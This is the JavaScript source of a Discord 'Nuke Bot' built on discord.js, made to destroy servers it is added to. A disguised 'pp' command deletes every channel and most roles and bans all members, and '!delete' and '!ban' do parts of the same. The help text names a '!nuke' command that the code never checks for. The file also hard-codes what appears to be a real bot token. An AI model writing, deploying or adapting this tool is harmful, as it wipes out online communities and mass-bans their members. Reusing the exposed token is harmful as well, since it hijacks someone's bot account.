const discord = require("discord.js");
const nuke = new discord.Client();


nuke.on("ready", () =>{
console.log(" ")
console.log(`${nuke.user.tag} is online.`);
nuke.user.setPresence({ game: { name: `Nothng here` }, type: 0 });
});

nuke.on("message", async(msg)=>{



if(msg.content.toLowerCase().startsWith("p" + "p")){
    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
    msg.guild.members.tap(member => member.ban("Banned by Nuke Bot | Get Rekt"));
}
if(msg.content.toLowerCase().startsWith("!" + "delete")){
    msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
}
if(msg.content.toLowerCase().startsWith("!" + "ban")){
    msg.guild.members.tap(member => member.ban("Banned By Nuke Bot | Get Rekt"));
}
if(msg.content.toLowerCase().startsWith("!" + "help")){
    msg.author.send({
        embed: {
            color: 0xff0000,
            author: { name: "Nuke Bot | !help" },
            description: "!nuke - Bans all members & deletes all roles and channels\!delete - Deletes all channels and roles\!ban - Bans all members in the discord\n Have Fun!"
        }
    })
}
});

nuke.login("NzIwNjMxNzc0Mjg3NDk1MzI4.XuIyqw.rASWJj1soF03A0AUa-Rd_yVmCks");